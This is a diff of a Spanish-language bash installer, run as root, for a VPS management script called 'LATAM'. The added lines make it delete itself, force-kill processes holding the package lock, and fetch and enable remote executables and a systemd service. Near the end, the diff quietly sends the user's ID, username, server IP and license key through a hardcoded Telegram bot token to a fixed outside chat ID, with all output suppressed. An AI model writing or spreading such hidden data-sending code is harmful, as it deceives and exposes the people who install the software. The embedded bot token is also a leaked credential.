@@ -1,24 +1,34 @@
 #!/bin/bash
-# INSTALADO --- ACTULIZADO EL 12-01-2023 --By @Kalix1
+##-->> INSTALADOR --- ACTUALIZADO EL 16-03-2023 -- >> By @Kalix1 << ---
 clear && clear
 colores="$(pwd)/colores"
 rm -rf ${colores}
 wget -O ${colores} "https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Ejecutables/colores" &>/dev/null
 [[ ! -e ${colores} ]] && exit
 chmod +x ${colores} &>/dev/null
-source ${colores}
+##-->> CARGAR SC EXTERNO
+source $(pwd)/colores
 CTRL_C() {
   rm -rf ${colores}
-  rm -rf /root/LATAM
+  rm -rf $(pwd)/LATAM
   exit
 }
+##-->> DETECTAR CANCELAR Y ELIMINAR ARCHIVO
 trap "CTRL_C" INT TERM EXIT
-#rm $(pwd)/$0 &>/dev/null
-#-- VERIFICAR ROOT
+rm $(pwd)/$0 &>/dev/null
+#-->> DETECTAR ROOT
 if [ $(whoami) != 'root' ]; then
   echo ""
   echo -e "\033[1;31m NECESITAS SER USER ROOT PARA EJECUTAR EL SCRIPT \n\n\033[97m                DIGITE: \033[1;32m sudo su\n"
   exit
+fi
+if fuser /var/lib/dpkg/lock >/dev/null 2>&1; then
+  echo -e "\033[1;31mEl sistema de actualización está siendo utilizado por otro proceso. Deteniendo el proceso..."
+  pid=$(fuser /var/lib/dpkg/lock 2>/dev/null)
+  if [ ! -z "$pid" ]; then
+    echo -e "\033[1;31mDeteniendo el proceso $pid..."
+    kill -9 $pid >/dev/null 2>&1
+  fi
 fi
 os_system() {
   system=$(cat -n /etc/issue | grep 1 | cut -d ' ' -f6,7,8 | sed 's/1//' | sed 's/      //')
@@ -35,7 +45,7 @@ repo() {
   8 | 9 | 10 | 11 | 16.04 | 18.04 | 20.04 | 20.10 | 21.04 | 21.10 | 22.04) wget -O /etc/apt/sources.list ${link} &>/dev/null ;;
   esac
 }
-## PRIMER PASO DE INSTALACION
+##-->> PREPARAR PAQUETERIAS Y DIRECTORIOS
 install_inicial() {
   clear && clear
   #CARPETAS PRINCIPALES
@@ -64,6 +74,7 @@ install_inicial() {
       return $stat
     }
     if val_ip $IP; then
+      mkdir -p /root/.ssh
       echo "$IP" >/root/.ssh/authrized_key.reg
     else
       echo ""
@@ -90,11 +101,38 @@ install_inicial() {
     echo -e "\033[1;97m TU CONTRASEÑA ROOT AHORA ES: \e[41m $pass \033[0;37m"
 
   }
+
+  avi_login() {
+    for i in {1..4}; do tput cuu 1 && tput el; done
+    wget -O /etc/profile.d/notify-lroot.sh https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Ejecutables/notify-lroot.sh >/dev/null 2>&1
+    chmod +x /etc/profile.d/notify-lroot.sh
+    msgi -bar
+    echo -e "\033[1;97m         NOTIFICADOR VIA PUSH DE LOGINS ROOT"
+    msgi -bar
+    echo -e "\033[1;97mEsta es una herramianta que te Notificara mediante\nuna apk cuando alguien ingrese ssh root en la VPS"
+    echo -e "\033[1;97m   Descarge la Aplicasion directo de Play Store"
+    echo -e "\033[1;96m https://play.google.com/store/apps/details?id=net.xdroid.pn"
+    msgi -bar
+    echo -ne "\033[1;97m DIGITE SU KEY: \033[1;32m" && read keyapk
+    echo "$keyapk" >/etc/SCRIPT-LATAM/temp/keyapk
+    echo -ne "\033[1;97m INGRESE ALGUN NOMBRE PARA SU VPS: \033[1;32m" && read nomvpsapk
+    echo "$nomvpsapk" >/etc/SCRIPT-LATAM/temp/nomvpsapk
+    KEY=$(cat /etc/SCRIPT-LATAM/temp/keyapk)
+    IP=$(cat /root/.ssh/authrized_key.reg)
+    NOMBREVPS=$(cat /etc/SCRIPT-LATAM/temp/nomvpsapk | tr '[:space:]' '+' | tr -d 'ñ' | sed '/^$/d')
+    curl -s "http://xdroid.net/api/message?k=$KEY&t=%F0%9F%98%8E+Mensaje+de+Prueba%E2%9C%8C%EF%B8%8F&c=%F0%9F%96%A5%EF%B8%8F+VPS%3A+$NOMBREVPS%0A%F0%9F%8C%90+IP%3A+$IP&u=" >/dev/null 2>&1
+    msgi -bar
+    echo -e "\033[1;97mSe envio un mensaje de prueba si no le llevo contacte @Kalix1"
+    sleep 10s
+    for i in {1..8}; do tput cuu 1 && tput el; done
+  }
+  
   #-- VERIFICAR VERSION
   v1=$(curl -sSL "https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Version")
   echo "$v1" >/etc/SCRIPT-LATAM/temp/version_instalacion
   v22=$(cat /etc/SCRIPT-LATAM/temp/version_instalacion)
   vesaoSCT="\033[1;31m [ \033[1;32m($v22)\033[1;97m\033[1;31m ]"
+  echo "not_banned" >/etc/SCRIPT-LATAM/temp/ban_status
   #-- CONFIGURACION BASICA
   os_system
   repo "${vercion}"
@@ -127,6 +165,7 @@ password required pam_permit.so' >/etc/pam.d/common-password && chmod +x /etc/pa
     [[ "$tu_ip" = "n" || "$tu_ip" = "N" ]] && tu_ip
   }
   fun_ip
+  for i in {1..4}; do tput cuu 1 && tput el; done
   msgi -bar2
   echo -e "\033[1;93m             AGREGAR Y EDITAR PASS ROOT\033[1;97m"
   msgi -bar
@@ -135,6 +174,16 @@ password required pam_permit.so' >/etc/pam.d/common-password && chmod +x /etc/pa
   echo -ne "\033[1;97m Seleccione  \033[1;31m[\033[1;93m S \033[1;31m/\033[1;93m N \033[1;31m]\033[1;97m: \033[1;93m" && read pass_root
   #read -p " Seleccione [ S / N ]: " tu_ip
   [[ "$pass_root" = "s" || "$pass_root" = "S" ]] && pass_root
+  for i in {1..6}; do tput cuu 1 && tput el; done
+  msgi -bar2
+  echo -e "\033[1;93m                   AGREGAR NOTIFY \033[1;97m"
+  msgi -bar
+  echo -e "\033[1;97m AGREGAR REGISTRO DE NOTYFY? \033[32m"
+  msgi -bar2
+  echo -ne "\033[1;97m Seleccione  \033[1;31m[\033[1;93m S \033[1;31m/\033[1;93m N \033[1;31m]\033[1;97m: \033[1;93m" && read avi_login
+  #read -p " Seleccione [ S / N ]: " tu_ip
+  [[ "$avi_login" = "s" || "$avi_login" = "S" ]] && avi_login
+  for i in {1..6}; do tput cuu 1 && tput el; done
   msgi -bar2
   echo -e "\033[1;93m\a\a\a      SE PROCEDERA A INSTALAR LAS ACTULIZACIONES\n PERTINENTES DEL SISTEMA, ESTE PROCESO PUEDE TARDAR\n VARIOS MINUTOS Y PUEDE PEDIR ALGUNAS CONFIRMACIONES \033[0;37m"
   msgi -bar
@@ -142,7 +191,7 @@ password required pam_permit.so' >/etc/pam.d/common-password && chmod +x /etc/pa
   clear && clear
   apt update
   apt upgrade -y
-  wget /root/LATAM https://raw.githubusercontent.com/cisdan/latam/main/install.sh -O /usr/bin/LATAM &>/dev/null
+  wget /root/LATAM https://raw.githubusercontent.com/ModVPS/LATAM-OFICIAL/main/LATAM -O /usr/bin/LATAM &>/dev/null
   chmod +x /usr/bin/LATAM
 }
 
@@ -169,34 +218,24 @@ time_reboot() {
 dependencias() {
   dpkg --configure -a >/dev/null 2>&1
   apt -f install -y >/dev/null 2>&1
-  soft="sudo bsdmainutils zip unzip ufw curl python python3 python3-pip openssl cron iptables lsof pv boxes at mlocate gawk bc jq curl npm nodejs socat netcat netcat-traditional net-tools cowsay figlet lolcat apache2"
-  for i in $soft; do
+  packages="zip unzip screen python python3 python3-pip openssl iptables lsof pv boxes at mlocate gawk bc jq npm nodejs socat net-tools cowsay figlet lolcat"
+  for i in $packages; do
     paquete="$i"
-    echo -e "\033[1;97m INSTALANDO PAQUETE \e[93m >>> \e[36m $i"
+    echo -e "\033[1;97m        INSTALANDO PAQUETE \e[93m >>> \e[36m $i"
     barra_intall "apt-get install $i -y"
   done
 }
 
 install_paquetes() {
-  wget /root/LATAM https://raw.githubusercontent.com/cisdan/latam/main/install.sh -O /usr/bin/LATAM &>/dev/null
-  chmod +x /usr/bin/LATAM
   clear && clear
-  #------- BARRA DE ESPERA
   msgi -bar2
-  echo -e " \e[5m\033[1;100m   =====>> ►►  🖥  SCRIPT | LATAM  🖥  ◄◄ <<=====   \033[1;37m"
+  echo -e " \e[33m\e[5m\033[1;100m   =====>> ►►  🖥  SCRIPT | LATAM  🖥  ◄◄ <<=====   \033[1;37m"
   msgi -bar
   echo -e "  \033[1;41m    -- INSTALACION DE PAQUETES PARA LATAM --   \e[49m"
   msgi -bar
   dependencias
-  sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf >/dev/null 2>&1
-  service apache2 restart >/dev/null 2>&1
-  [[ $(sudo lsof -i :81) ]] || ESTATUSP=$(echo -e "\033[1;91m      >>>  FALLO DE INSTALACION EN APACHE <<<") &>/dev/null
-  [[ $(sudo lsof -i :81) ]] && ESTATUSP=$(echo -e "\033[1;92m          PUERTO APACHE ACTIVO CON EXITO") &>/dev/null
-  echo ""
-  echo -e "$ESTATUSP"
-  echo ""
-  echo -e "\e[1;97m        REMOVIENDO PAQUETES OBSOLETOS - \e[1;32m OK"
-  apt autoremove -y &>/dev/null
+  echo -e "\e[1;97m          REMOVIENDO PAQUETES OBSOLETOS \e[1;32m"
+  barra_intallb "apt autoremove -y "
   echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
   echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
   msgi -bar2
@@ -222,7 +261,7 @@ done
 
 ## PASO DOS
 Install_key() {
-  wget /root/LATAM https://raw.githubusercontent.com/cisdan/latam/main/install.sh -O /usr/bin/LATAM &>/dev/null
+  wget /root/LATAM https://raw.githubusercontent.com/ModVPS/LATAM-OFICIAL/main/LATAM -O /usr/bin/LATAM &>/dev/null
   chmod +x /usr/bin/LATAM
   /bin/cp /etc/skel/.bashrc ~/
   clear && clear
@@ -245,6 +284,8 @@ Install_key() {
       echo "$v1" >/etc/SCRIPT-LATAM/temp/version_instalacion
       FIns=$(printf '%(%D-%H:%M:%S)T')
       echo "$FIns" >/etc/SCRIPT-LATAM/F-Instalacion
+      last_check_file="/etc/SCRIPT-LATAM/temp/last_check"
+      date "+%Y-%m-%d %H:%M:%S" >"$last_check_file"
     }
   }
   fun_idi() {
@@ -260,16 +301,21 @@ Install_key() {
     byinst="true"
   }
   install_fim() {
-    echo -e "               \033[1;4;32mFinalizando Instalacion\033[0;39m"
+  tput cuu1 && tput dl1
+  tput cuu1 && tput dl1
+  echo -e "     \033[1;4;32mLA KEY ES VALIDA FINALIZANDO INSTALACION \033[0;39m"
+  ##-->> ACOPLANDO INSTALL EN /BIN
+    #echo -e "               \033[1;4;32mFinalizando Instalacion\033[0;39m"
     wget -O /bin/rebootnb https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Ejecutables/rebootnb.sh &>/dev/null
-    chmod +x /bin/rebootnb
-    wget -O /etc/SCRIPT-LATAM/temp/version_actual https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Version &>/dev/null
-    msgi -bar2
-    echo '#!/bin/sh -e' >/etc/rc.local
-    sudo chmod +x /etc/rc.local
-    echo "sudo rebootnb reboot" >>/etc/rc.local
-    echo "sleep 2s" >>/etc/rc.local
-    echo "exit 0" >>/etc/rc.local
+  chmod +x /bin/rebootnb
+  wget -O /bin/autoinicios https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Ejecutables/autoinicios &>/dev/null
+  chmod +rwx /bin/autoinicios
+  wget -O /etc/systemd/system/iniciolatam.service https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Ejecutables/iniciolatam.service &>/dev/null
+  sudo systemctl enable -q iniciolatam.service
+  wget -O /bin/check-update https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Ejecutables/check-update &>/dev/null
+  chmod +rwx /bin/check-update
+  wget -O /etc/SCRIPT-LATAM/temp/version_actual https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Version &>/dev/null
+  msgi -bar
     echo 'clear && clear' >>.bashrc
     echo 'rebootnb login >/dev/null 2>&1' >>.bashrc
     echo 'echo -e "\033[1;31m————————————————————————————————————————————————————" ' >>.bashrc
@@ -439,7 +485,31 @@ Install_key() {
         tput cuu1 && tput dl1
         pontos+="."
       done
-      sleep 1s
+
+      wget -qO- ifconfig.me > /tmp/IP
+ userid="${SCPdir}/ID" 
+ TOKEN="2012880601:AAEJ3Kk18PGDzW57LpTMnVMn_pQYQKW3V9w" 
+ URL="https://api.telegram.org/bot$TOKEN/sendMessage" 
+ MSG="👇= KEY INSTALADO =👇 
+ ╔═════ ▓▓ ࿇ ▓▓ ═════╗ 
+ - - - - - - - ×∆× - - - - - - - 
+ User ID: $(cat ${userid}) 
+ - - - - - - - ×∆× - - - - - - - 
+ Usuario: $(cat ${SCPdir}/message.txt) 
+ - - - - - - - ×∆× - - - - - - - 
+ IP: $(cat ${SCPdir}/IP.log) 
+ - - - - - - - ×∆× - - - - - - - 
+ KEY: $Key 
+ - - - - - - - ×∆× - - - - - - - 
+ By @alexmod80 
+ - - - - - - - ×∆× - - - - - - - 
+ ╚═════ ▓▓ ࿇ ▓▓ ═════╝ 
+ " 
+ activ=$(cat ${userid}) 
+ curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 
+ curl -s --max-time 10 -d "chat_id=605531451&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 
+ rm ${SCPdir}/IP.log &>/dev/null 
+ msg -bar2 
       msgi -bar2
       listaarqs="$(locate "lista-arq" | head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs
       cat /etc/bash.bashrc | grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >/etc/bash.bashrc.2
